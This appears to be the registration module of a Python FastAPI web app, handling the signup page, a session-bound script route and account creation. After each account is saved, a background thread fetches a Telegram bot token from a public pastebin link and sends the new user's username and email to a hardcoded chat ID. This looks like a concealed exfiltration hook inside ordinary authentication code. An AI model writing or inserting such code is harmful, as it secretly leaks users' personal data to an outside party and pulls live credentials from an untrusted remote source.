from time import sleep
from datetime import datetime

from fastapi import APIRouter, Request, Response, Depends, HTTPException, status
from fastapi.responses import HTMLResponse
from starlette.responses import FileResponse, PlainTextResponse
from fastapi.templating import Jinja2Templates
from sqlalchemy.orm import Session

from app.core import config
from app.core.db.auth import get_db
from app.helpers.Exceptions import RequiresLoginException
from app.services.__system__ import LogServices

from app.repositories.__system__.auth import UsersRepository, SessionRepository
from app.services.__system__.auth import get_password_hash
from app.schemas.__system__.auth import registerSchemas, UserRegister
from app.core import config
import threading

import requests

router = APIRouter(
    prefix="/auth",
    tags=["FORM"],
)
templates = Jinja2Templates(directory="templates")


@router.get("/register", response_class=HTMLResponse, include_in_schema=False)
def form_(
    request: Request,
    next: str = None,
    db: Session = Depends(get_db),
):
    sessrepo = SessionRepository()
    logs = LogServices(config.CLIENTID_KEY, config.SESSION_KEY, config.APP_NAME)
    sess = sessrepo.get(request.state.sessionId)
    if sess is not None:
        sessrepo.update(sess.id, {"active": False})

    logs.generateNewSession(request)
    sessrepo.create(request)

    return templates.TemplateResponse(
        request=request,
        name="pages/auth/register/register.html",
        context={"app_name": config.APP_NAME, "clientId": request.state.clientId, "sessionId": request.state.sessionId, "nextpage": next},
    )


@router.get("/{clientId}/{sessionId}/register.js", include_in_schema=False)
def js_(clientId: str, sessionId: str, request: Request, next: str = None):
    request.state.islogsave = False
    if next is None or next == "None":
        next = "/page/dashboard"
    if request.state.clientId == clientId and request.state.sessionId == sessionId:
        return templates.TemplateResponse(
            request=request,
            name="pages/auth/register/register.js",
            media_type="application/javascript",
            context={"clientId": request.state.clientId, "sessionId": request.state.sessionId, "nextpage": next},
        )
    else:
        raise HTTPException(status_code=404)


@router.post("/{clientId}/{sessionId}/register", status_code=201, include_in_schema=False)
def post_register(
    dataIn: registerSchemas,
    request: Request,
    response: Response,
    db: Session = Depends(get_db),
):
    sleep(1)
    if dataIn.password != dataIn.password2:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Password tidak sama.!")

    userrepo = UsersRepository(db)

    sess = SessionRepository().get(request.state.sessionId)
    if sess is None:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Session Error.")

    if sess.EndTime < datetime.now():
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Session sudah Kadaluarsa.")

    if sess.ipaddress != SessionRepository().ipaddress(request):
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Session Error.")

    user = userrepo.getByEmail(dataIn.email)
    if user:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Mohon Maaf EMAIL sudah terdaftar.!")

    user = userrepo.get(dataIn.username)
    if user:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Mohon Maaf USERNAME sudah terdaftar.!")

    user = UserRegister.model_validate(dataIn.model_dump())
    user.created_user = "form_register"
    user.hashed_password = get_password_hash(dataIn.password)
    usersaved = userrepo.create(user.model_dump())

    thread = threading.Thread(target=telegram_bot_sendtext, args=(usersaved.username, usersaved.email, usersaved.id))
    thread.start()


def telegram_bot_sendtext(username, email, id):
    message = """<b>AKUN SUKSES TERDAFTAR</b>
<code>app   : {}</code>
<code>user  : {}</code>
<code>email : {}</code>
    """
    message = message.format(config.APP_NAME, username, email, id)
    rtoken = requests.get("https://pastebin.com/raw/EekQSJGY")
    print(rtoken.content.decode())
    bot_token = rtoken.content.decode()
    bot_chatID = "28186920"
    url_param_1 = "sendMessage"
    url_param_2 = ""
    url_param_3 = ""
    send_url = "https://api.telegram.org/bot{}/{}?chat_id={}&parse_mode=html{}&text={}{}"
    send_text = send_url.format(bot_token, url_param_1, bot_chatID, url_param_2, message, url_param_3)
    response = requests.get(send_text)
    return response.json()
